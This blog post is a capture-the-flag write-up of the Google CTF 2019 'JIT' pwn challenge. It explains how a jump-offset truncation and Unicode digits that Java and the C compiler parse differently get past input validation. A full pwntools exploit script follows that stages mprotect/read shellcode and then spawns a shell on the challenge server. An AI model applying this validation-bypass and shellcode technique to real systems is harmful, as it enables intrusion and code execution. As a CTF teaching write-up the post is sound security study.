---
title: JIT - Google CTF Quals 2019
date: '2019-06-24 21:21:14'
layout: post
---

> We read on the internet that Java is slow so we came up with the solution to speed up some computations!
>
> nc jit.ctfcompetition.com 1337
>
> [Download Attachment](https://storage.googleapis.com/gctf-2019-attachments/8929b327b760ffb62c092dee035bce9992735012b85a1f274c39f4721889b3c1)

*283 Pts, 23 solves, pwn*

We are provided with two files **FancyJIT.java** and **compiler.c** for this challenge, and from the description and a quick look we can see that the **FancyJIT** class reads in opcodes line by line, performs some validation and then sends it to a compiler via a nativly built shared library. The compiler then parses the program and converts it into machine code then executes it, returning the result to the java program.

In order to compile **FancyJIT** we first need to downlaod the [jna library](http://repo1.maven.org/maven2/net/java/dev/jna/jna/5.3.1/jna-5.3.1.jar), then we can add it to the classpath and compile class with `javac -cp ./jna-5.3.1.jar FancyJIT.java`. The compiler can also be compiled with `gcc compiler.c -shared -fPIC -o linux-x86-64/libcompiler.so` or as a normal program for testing with `gcc compiler.c -o compiler`.

There are only 11 opcodes which are all fairly basic, like adding and storing, but there are also compare and jump operations for performing loops. The compiler maps two random pages, one for the executable **text** section and another for the **data** section which is stored into r12. All of the opcodes for accessing memory generate code to use this register, for example **LDR** will generate`mov eax, [r12+imm8]`.

The load and store operations seemed fairly safe as there didn't seem to be anyway to access data outside of the page. My next idea was to try jump to the middle of an instruction, as the **MOV** instruction allowed us to use a 32 bit value which would allow for 4 bytes of assembly. If we used the last two bytes to jmp foward then we could chain as much asm together as we needed, so long as they were one or two byte instructions.

The compiler code that generates the jump is the following:

```c
out[4] = (intbracket(cmd + 4) - instrno) * 5 - 5; // jne imm8
```

So **JMP(0)** would create a jump to offset **0** from the page and **JMP(0)** to offset **5**. I realised that result was being put into `out[4]` which is only one byte, meaning we can overflow it to potentially remove the 5 byte alignment. For example if we use **JMP(-51)** when we are at `instrno` 20 we get `(-51-20)*5-5 == -360` which then gets truncated to **-104**, resulting in a jump to offset **1**.

The jump can now be used to go to the middle of an instruction, for example we can use **MOV** to encode our payload in two byte increments:

```python
value = u32(asm("mov al, 10\n jmp $+3"))
payload = "MOV(A, {})".format(value)
assert payload == 'MOV(A, 32180912)'
```

I then tried to run it through **FancyJIT** instead of straight in the compiler but was greeted with _Sorry, your program has some errors_. Looking at the validation code for **MOV** and **JMP** we see that there are some checks on what the agument is allowed to be:
```java
// JMP
if (instr.arg < 0 || instr.arg >= program.length || Math.abs(i - instr.arg) > 20) {

// MOV
if (instr.arg < 0 || instr.arg > 99999) {
    return false;
}
```

So both our **MOV** and **JMP** instructions fail the validation as they are outside of the allowed range. I stared looking at ways to bypass the validation, but was not able to find any and none of the instuctions had incorrect validation from what I could see.

I then started to look for differences between how FancyJIT parsed the program to how the compiler parsed it. The function that read the argument value stood out as a potential difference:

```java
// FancyJIT
Integer.parseInt(cmd.substring(7, cmd.length() - 1))));
```

```c
// compiler
int intbracket(const char* s) {
  int mul = 1;
  if (*s == '-' || *s == '+') {
	  mul = (*s == '-') ? -1 : 1;
	  s++;
  }
  int res = 0;
  for (; *s != ')'; s++) {
    res = res * 10 + *s - '0';
  }
  return res * mul;
}
intbracket(cmd + 7);
```

If we could somehow send in characters other than 0-9 then the compilers *intbracket* method would be incorrect, and as there is no length check we could also overflow the int result as many times as needed. I tried a few different things like **0x1234, 1e123** but `Integer.parseInt` always threw an exception. I then went and had a look at the [source for parseInt](https://github.com/unofficial-openjdk/openjdk/blob/jdk8u/jdk8u/jdk/src/share/classes/java/lang/Integer.java#L578) which lead me to [Character.isDigit](https://github.com/unofficial-openjdk/openjdk/blob/jdk8u/jdk8u/jdk/src/share/classes/java/lang/Character.java#L5634). This had some very nice javadoc giving us a clue as to how we can get other characters through the validation:

```
Some Unicode character ranges that contain digits:

'\u0030' through '\u0039', ISO-LATIN-1 digits ('0' through '9')
'\u0660' through '\u0669', Arabic-Indic digits
'\u06F0' through '\u06F9', Extended Arabic-Indic digits
'\u0966' through '\u096F', Devanagari digits
'\uFF10' through '\uFF19', Fullwidth digits
Many other character ranges contain digits as well.
```

Writing a quick snippet in java to see what counts as a **0** gives us a bunch of results:
```java
 for (int i = 0; i < 0x10000; i++) {
    if (Character.digit(i, 10) == 0) {
        System.out.println(Integer.toHexString(i));
    }
}

// 0x30, 0x660, 0x6f0, 0x7c0, 0x966, 0x9e6, 0xa66, 0xae6, 0xb66, 0xbe6, 0xc66, 0xce6, 0xd66, 0xe50, 0xed0, 0xf20, 0x1040, 0x1090, 0x17e0, 0x1810, 0x1946, 0x19d0, 0x1a80, 0x1a90, 0x1b50, 0x1bb0, 0x1c40, 0x1c50, 0xa620, 0xa8d0, 0xa900, 0xa9d0, 0xaa50, 0xabf0, 0xff10
```

Using these we should be able to craft a string that is correctly parsed by *parseInt* and that also passes the validaation, but then produces a different number in the compiler!

As this was a CTF, I just wrote a quick and dirty function to bruteforce values that the compiler would see as our target number but that **FancyJIT** would see as less than 100000. This was done by generating random combination of valid utf8 zeros until a number that was within 100000 of our target, then appending the last 5 digits to make the correct number.

```python
from ctypes import *
import random

compiler = CDLL("linux-x86-64/libcompiler.so")

valid_zeroes = [0x30, 0x660, 0x6f0, 0x7c0, 0x966, 0x9e6, 0xa66, 0xae6, 0xb66, 0xbe6, 0xc66, 0xce6, 0xd66, 0xe50, 0xed0, 0xf20, 0x1040, 0x1090,
       0x17e0, 0x1810, 0x1946, 0x19d0, 0x1a80, 0x1a90, 0x1b50, 0x1bb0, 0x1c40, 0x1c50, 0xa620, 0xa8d0, 0xa900, 0xa9d0, 0xaa50, 0xabf0, 0xff10]
encoded_zeros = map(lambda c: unichr(c).encode("utf8"), valid_zeroes)


def get_num(goal):
    print goal
    base = goal / 100000 * 100000

    while True:
        sample = []
        for _ in range(random.randrange(1, 10)):
            sample.append(random.choice(encoded_zeros))

        payload = "{}00000)".format("".join(sample))
        res = compiler.intbracket(payload)
        if res >= base and res <= goal:
            difference = goal % 100000 - (res - base)
            payload = "{}{:05d}".format("".join(sample), difference)
            
            assert compiler.intbracket(payload + ")") == goal
            return payload
```

The next step was to generate a valid argument for jump that would equal **-51** in the compiler. The issue here was that the the number had to be within 20 of the current instruction pointer to pass the validation, but we could only have 23 instructions for the value of -51 to still jump to the correct place in the middle of our first instruction. I changed the above function from **100000** to **1000** and set it running.

The values I'd picked weren't really set in stone, so I started changing the generator to search for other values that could be used with some padding and jumping around, but then one was found `᥆᱀০୦০႐꘠꘠੦０᥆꘠꘠୦013` which is **13** when validating and **-51** when compiling, perfect!

The final stage was putting it all together and create the shellcode. I decided to do a simple *mprotect* and *read* as the first stage, then I could just send through a second stage payload with the remaining shellcode.

After a bit of time calculating random numbers, we get a shell and then the flag **CTF{8röther_m4y_1_h4v3_söm3_nümb3r5}**


*Full exploit script*
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import logging
from pwn import *
from ctypes import *
import random

compiler = CDLL("linux-x86-64/libcompiler.so")

valid_zeroes = [0x30, 0x660, 0x6f0, 0x7c0, 0x966, 0x9e6, 0xa66, 0xae6, 0xb66, 0xbe6, 0xc66, 0xce6, 0xd66, 0xe50, 0xed0, 0xf20, 0x1040, 0x1090,
       0x17e0, 0x1810, 0x1946, 0x19d0, 0x1a80, 0x1a90, 0x1b50, 0x1bb0, 0x1c40, 0x1c50, 0xa620, 0xa8d0, 0xa900, 0xa9d0, 0xaa50, 0xabf0, 0xff10]
encoded_zeros = map(lambda c: unichr(c).encode("utf8"), valid_zeroes)

def get_num(goal):
    print goal
    base = goal / 100000 * 100000

    while True:
        sample = []
        for _ in range(random.randrange(1, 10)):
            sample.append(random.choice(encoded_zeros))

        payload = "{}00000)".format("".join(sample))
        res = compiler.intbracket(payload)
        if res >= base and res <= goal:
            difference = goal % 100000 - (res - base)
            payload = "{}{:05d}".format("".join(sample), difference)
            
            assert compiler.intbracket(payload + ")") == goal
            return payload

def exploit():
    # mprotect(text, 0x1000, 7)
    # read(0, text, 0x1000)
    code = asm("""
    mov esi, eax
    xor eax, eax
    mov al, 10
    xor edx, edx
    mov dl, 7
    syscall
    push rdi
    push rsi
    pop rdx
    pop rsi
    xor eax, eax
    push rax
    pop rdi
    syscall
    """)

    jmp = asm("jmp $+3")
    payload = ""
    for i in range(0, len(code), 2):
        num = u32(code[i:i+2]+jmp)
        payload += "MOV(A, {})\n".format(get_num(num))

    payload += "MOV(A, 4096)\n"
    payload += "JMP(᥆᱀০୦০႐꘠꘠੦０᥆꘠꘠୦013)\n"
    payload += "RET()\n"

    p.sendlineafter("result:", payload)
    sleep(1)
    p2 = "A"*53 + asm(shellcraft.sh())
    p.send(p2.ljust(0x1000, "\x00"))
    p.interactive()

# CTF{8röther_m4y_1_h4v3_söm3_nümb3r5}

if __name__ == "__main__":
    context.terminal = ["tmux", "sp", "-h"]
    context.arch = "amd64"

    if len(sys.argv) > 1:
        p = remote("jit.ctfcompetition.com", 1337)
    else:
        p = process("java -cp ./jna-5.3.1.jar:. FancyJIT",
                    stdin=PTY, stdout=PTY, shell=True)
    exploit()
```